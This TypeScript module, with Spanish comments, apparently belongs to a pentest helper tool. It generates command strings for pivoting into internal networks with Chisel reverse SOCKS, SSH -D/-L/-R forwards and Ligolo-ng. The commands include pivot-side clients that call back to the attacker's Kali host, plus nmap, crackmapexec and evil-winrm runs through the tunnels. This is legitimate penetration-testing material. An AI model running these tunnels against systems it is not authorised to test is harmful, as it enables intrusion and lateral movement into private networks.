/**
 * Constructores de comandos para flujos de tunneling pivot-driven.
 *
 * Cubre los patrones más comunes en pentesting interno:
 *  - Chisel reverse SOCKS (cuando el pivot no admite conexiones entrantes)
 *  - SSH -D (SOCKS dinámico)
 *  - SSH -L (port-forward local hacia un host del target)
 *  - SSH -R (reverse port-forward del pivot a tu Kali)
 *  - Ligolo-ng (proxy modernísimo con TUN interface, sin necesidad de proxychains)
 *
 * El módulo es puro: sólo genera strings. La ejecución la decide el operador.
 */

export interface PivotContext {
  /** IP o hostname de tu máquina (Kali / atacante). Lo ve el pivot. */
  kaliIp: string;
  /** Puerto que tu Kali expone para que el pivot conecte (servidor / listener). */
  kaliPort: string;
  /** Usuario SSH del pivot (para los flujos basados en OpenSSH). */
  pivotUser: string;
  /** IP del pivot (la máquina intermedia con acceso al target). */
  pivotIp: string;
  /** Red o IP del target que el pivot puede alcanzar. */
  targetNet: string;
  /** Puerto del servicio target (para SSH -L). */
  targetPort: string;
  /** Puerto SOCKS5 local en Kali (default 1080). */
  socksPort: string;
}

export interface PivotPlan {
  /** Lista ordenada de comandos a ejecutar en tu máquina (Kali). */
  kaliCmds: string[];
  /** Lista ordenada de comandos a ejecutar en el pivot. */
  pivotCmds: string[];
  /** Cómo usar el túnel una vez establecido. */
  usage: string[];
  /** Notas operativas relevantes (caveats, requisitos). */
  notes: string;
}

export type PivotTool =
  | 'chisel'
  | 'ssh-dynamic'
  | 'ssh-local'
  | 'ssh-remote'
  | 'ligolo';

export interface PivotToolDef {
  id: PivotTool;
  label: string;
  shortLabel: string;
  description: string;
}

export const PIVOT_TOOLS: PivotToolDef[] = [
  {
    id: 'chisel',
    label: 'Chisel (reverse SOCKS)',
    shortLabel: 'Chisel',
    description:
      'Túnel TCP via HTTP/WS, con SOCKS5 reverso. Ideal cuando el pivot está detrás de NAT pero puede salir hacia tu Kali.',
  },
  {
    id: 'ssh-dynamic',
    label: 'SSH -D (SOCKS dinámico)',
    shortLabel: 'SSH -D',
    description:
      'SOCKS5 dinámico nativo de OpenSSH. Lo más simple si tienes credenciales SSH del pivot y este permite salir.',
  },
  {
    id: 'ssh-local',
    label: 'SSH -L (port-forward local)',
    shortLabel: 'SSH -L',
    description:
      'Forward de un puerto específico de Kali → pivot → target. Útil cuando sólo quieres un servicio concreto.',
  },
  {
    id: 'ssh-remote',
    label: 'SSH -R (reverse port-forward)',
    shortLabel: 'SSH -R',
    description:
      'El pivot abre una conexión saliente a Kali y expone un puerto interno suyo. Esquiva firewalls de entrada.',
  },
  {
    id: 'ligolo',
    label: 'Ligolo-ng (TUN proxy)',
    shortLabel: 'Ligolo',
    description:
      'Proxy moderno con TUN interface — el target aparece como una red enrutable en Kali, sin proxychains.',
  },
];

export function buildPlan(tool: PivotTool, ctx: PivotContext): PivotPlan {
  switch (tool) {
    case 'chisel':
      return chiselPlan(ctx);
    case 'ssh-dynamic':
      return sshDynamicPlan(ctx);
    case 'ssh-local':
      return sshLocalPlan(ctx);
    case 'ssh-remote':
      return sshRemotePlan(ctx);
    case 'ligolo':
      return ligoloPlan(ctx);
  }
}

// ─── chisel ──────────────────────────────────────────────────────────

function chiselPlan(c: PivotContext): PivotPlan {
  return {
    kaliCmds: [
      `# Servidor chisel escuchando para que el pivot conecte`,
      `chisel server --port ${c.kaliPort} --reverse`,
    ],
    pivotCmds: [
      `# Cliente chisel: conecta a Kali y expone SOCKS5 reverso en :${c.socksPort} del Kali`,
      `# Subir el binario al pivot primero (scp, curl, etc.)`,
      `./chisel client ${c.kaliIp}:${c.kaliPort} R:${c.socksPort}:socks`,
    ],
    usage: [
      `# En Kali, configura proxychains4 con:`,
      `#   socks5 127.0.0.1 ${c.socksPort}`,
      `# Y prefija cualquier herramienta:`,
      `proxychains4 nmap -sT -Pn -n ${c.targetNet}`,
      `proxychains4 curl http://${c.targetNet}:${c.targetPort}/`,
    ],
    notes:
      'Chisel sobrevive a firewalls de entrada del pivot porque la conexión la inicia él. Pre-requisito: el pivot puede conectar al puerto del Kali (típico en redes de pentest).',
  };
}

// ─── ssh dynamic (-D) ────────────────────────────────────────────────

function sshDynamicPlan(c: PivotContext): PivotPlan {
  return {
    kaliCmds: [
      `# SOCKS5 dinámico — todo lo que pase por :${c.socksPort} sale por el pivot`,
      `ssh -D ${c.socksPort} -N -f ${c.pivotUser}@${c.pivotIp}`,
      `# -N: no comando, sólo túnel · -f: background`,
    ],
    pivotCmds: [
      `# Nada que ejecutar en el pivot — sólo necesitas credenciales SSH válidas.`,
    ],
    usage: [
      `# Usa proxychains4 con:  socks5 127.0.0.1 ${c.socksPort}`,
      `proxychains4 nmap -sT -Pn -n ${c.targetNet}`,
      `proxychains4 smbclient -L //${c.targetNet}/`,
    ],
    notes:
      'Requiere credenciales SSH (usuario/contraseña o clave). El pivot debe poder enrutar al target. Sin agente, sin binarios subidos: el SOCKS lo arma OpenSSH localmente.',
  };
}

// ─── ssh local (-L) ──────────────────────────────────────────────────

function sshLocalPlan(c: PivotContext): PivotPlan {
  return {
    kaliCmds: [
      `# Forward local: :${c.targetPort} de Kali → pivot → ${c.targetNet}:${c.targetPort}`,
      `ssh -L ${c.targetPort}:${c.targetNet}:${c.targetPort} -N -f ${c.pivotUser}@${c.pivotIp}`,
    ],
    pivotCmds: [
      `# Nada que ejecutar en el pivot.`,
    ],
    usage: [
      `# El servicio del target ahora vive en localhost:${c.targetPort} de Kali`,
      `curl http://127.0.0.1:${c.targetPort}/`,
      `# O abrelo en el navegador: http://127.0.0.1:${c.targetPort}`,
    ],
    notes:
      'A diferencia de -D, sólo expones un servicio concreto del target (no toda la red). Útil cuando ya sabes a qué quieres llegar y no quieres montar SOCKS.',
  };
}

// ─── ssh remote (-R) ─────────────────────────────────────────────────

function sshRemotePlan(c: PivotContext): PivotPlan {
  return {
    kaliCmds: [
      `# Escucha en :${c.kaliPort} de Kali (lo expondrá el pivot)`,
      `# Asegúrate de tener nc / un servicio escuchando ahí.`,
    ],
    pivotCmds: [
      `# Desde el pivot, abre un reverse forward: ${c.kaliPort}@kali → :${c.targetPort}@pivot`,
      `ssh -R ${c.kaliPort}:127.0.0.1:${c.targetPort} -N -f ${c.pivotUser}@${c.kaliIp}`,
    ],
    usage: [
      `# Desde Kali ahora puedes acceder al servicio interno del pivot:`,
      `curl http://127.0.0.1:${c.kaliPort}/`,
    ],
    notes:
      'Inverso conceptualmente: aquí el pivot inicia la conexión hacia Kali. Útil cuando ya tienes shell en el pivot pero no SSH del pivot a Kali — sí al revés.',
  };
}

// ─── ligolo-ng ───────────────────────────────────────────────────────

function ligoloPlan(c: PivotContext): PivotPlan {
  return {
    kaliCmds: [
      `# 1) Crear la interfaz TUN una sola vez en Kali`,
      `sudo ip tuntap add user $USER mode tun ligolo`,
      `sudo ip link set ligolo up`,
      `# 2) Arrancar el proxy (acepta conexiones del agent en :${c.kaliPort})`,
      `./proxy -selfcert -laddr 0.0.0.0:${c.kaliPort}`,
      `# 3) Dentro de la consola del proxy, tras "session":`,
      `#    » session`,
      `#    » 1   (elegir agente conectado)`,
      `#    » ifconfig   (ver redes del pivot)`,
      `#    » start   (activar el túnel)`,
      `# 4) Enrutar la red target hacia la interfaz ligolo`,
      `sudo ip route add ${c.targetNet} dev ligolo`,
    ],
    pivotCmds: [
      `# Subir el binario "agent" al pivot y ejecutarlo`,
      `./agent -connect ${c.kaliIp}:${c.kaliPort} -ignore-cert`,
    ],
    usage: [
      `# El target ahora aparece como una red enrutable en Kali.`,
      `# Cualquier herramienta nativa funciona sin proxychains:`,
      `nmap -sS -Pn ${c.targetNet}`,
      `crackmapexec smb ${c.targetNet}`,
      `evil-winrm -i ${c.targetNet} -u user -p pass`,
    ],
    notes:
      'Ligolo-ng es muchísimo más rápido que proxychains+chisel y soporta UDP. Requiere subir el agente al pivot (Linux y Windows) y crear la interfaz TUN una vez en Kali (sudo).',
  };
}
